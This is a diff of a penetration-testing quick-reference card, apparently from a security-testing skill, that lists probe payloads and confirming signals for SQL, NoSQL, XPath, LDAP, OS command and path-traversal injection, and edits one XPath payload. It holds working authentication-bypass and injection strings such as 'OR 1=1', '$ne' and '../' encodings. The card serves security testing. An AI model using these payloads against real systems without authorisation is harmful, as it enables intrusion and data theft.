@@ -16,7 +16,7 @@ Quick-lookup card. Mechanics in `chapters/`; mindset in `SKILL.md`; terms in `gl
 |---|---|---|
 | SQL | `' " \` \` ` \` | `OR 1=1` vs `AND 1=2`; `SLEEP(5)`/`WAITFOR`/`pg_sleep`; UNION col count → `version()` |
 | NoSQL (Mongo) | `[$ne]`, `{"$gt":""}`, `$where` | auth bypass; boolean content delta |
-| XPath | `' or '1'='1`, `']\|//*//./*['` | node dump / auth bypass |
+| XPath | `' or '1'='1`, `']\|//*\|/*['` | node dump / auth bypass |
 | LDAP | `*`, `*)(uid=*))(\|(uid=*` | filter bypass / attribute dump |
 | OS shell | `; \| & && \|\| \n $( ) \` ` | repeated timing delay; OOB DNS/HTTP hit |
 | Filesystem | `../`, `..\\`, `..;/`, `%2e%2e%2f`, `%252e`, `....//`, `%00.jpg` | file contents / source in response |
